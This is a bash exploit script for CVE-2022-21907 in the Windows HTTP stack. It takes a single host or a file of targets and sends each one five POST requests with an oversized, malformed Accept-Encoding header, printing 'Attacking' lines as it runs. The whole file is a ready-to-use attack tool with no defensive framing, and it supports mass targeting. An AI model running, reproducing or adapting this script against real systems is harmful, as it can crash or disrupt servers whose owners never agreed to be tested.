#!/usr/bin/env bash

REGIME=$1
IP=$2
PORT=$3

if [ -z "$REGIME" ] || [ "$REGIME" == "-h" ] || [ $REGIME == "--help" ];then
	echo "-------------------Welcome-to-CVE-2022-21907-by-1veresk---------------+";
	echo "+---------------------------------------------------------------------+";
	echo "+-------------------For-The-Help--------------------------------------+";
	echo "Example#1: ./cve-2022-21907.sh -h-------------------------------------+";
	echo "Example#2: ./cve-2022-21907.sh --help---------------------------------+";
	echo "+-------------------For-The-URL-Check---------------------------------+";
	echo "Example#1: ./cve-2022-21907.sh -u <IP> <PORT> [Default port will be 80]";
	echo "+-------------------For-The-File-Check--------------------------------+";
	echo "Example#1: ./cve-2022-21907.sh -f <FILENAME>--------------------------+";
	echo "+---------------------------------------------------------------------+";
	exit 1;
fi
# Checking if we have a target to attack
if [ -z "$IP" ];then
	echo "Enter  - u <IP> or -f <filename>";
	exit 1;
fi
# If PORT isn't mentioned - we stick the 80
if [ -z "$PORT" ]; then 
	PORT=80;
fi
# Attacking Target
if [ -e "$IP" ];then
	while read LINE; do
		if [ $PORT -eq 80 ];then
			for i in {1..5}
			do
				echo "Attacking - http://$LINE at $i time";
  				curl --connection-timeout 15 --insecure -X POST -H 'Accept-Encoding: AAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&AA&**AAAAAAAAAAAAAAAAAAAA**A,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAA,****************************AAAAAA, *, ,' http://$LINE;
  				sleep 5
			done
  		elif [ $PORT -eq 443 ];then
  			for i in {1..5}
			do
  				echo "Attacking - https://$LINE at $i time";
  				curl --connection-timeout 15 --insecure -X POST -H 'Accept-Encoding: AAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&AA&**AAAAAAAAAAAAAAAAAAAA**A,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAA,****************************AAAAAA, *, ,' https://$LINE;
  				sleep 5
			done
  		fi
	done <$IP	
else
	if [ $PORT -eq 80 ];then
		for i in {1..5}
		do
			echo "Attacking - http://$IP:$PORT at $i time";
			curl --insecure -X POST -H 'Accept-Encoding: AAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&AA&**AAAAAAAAAAAAAAAAAAAA**A,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAA,****************************AAAAAA, *, ,' http://$IP:$PORT;
			sleep 5
		done
	elif [ $PORT -eq 443 ];then
		for i in {1..5}
		do
			echo "Attacking - https://$IP:$PORT at $i time";
			curl -m 15 --insecure -X POST -H 'Accept-Encoding: AAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&AA&**AAAAAAAAAAAAAAAAAAAA**A,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAA,****************************AAAAAA, *, ,' https://$IP:$PORT;
			sleep 5
		done
	fi
fi
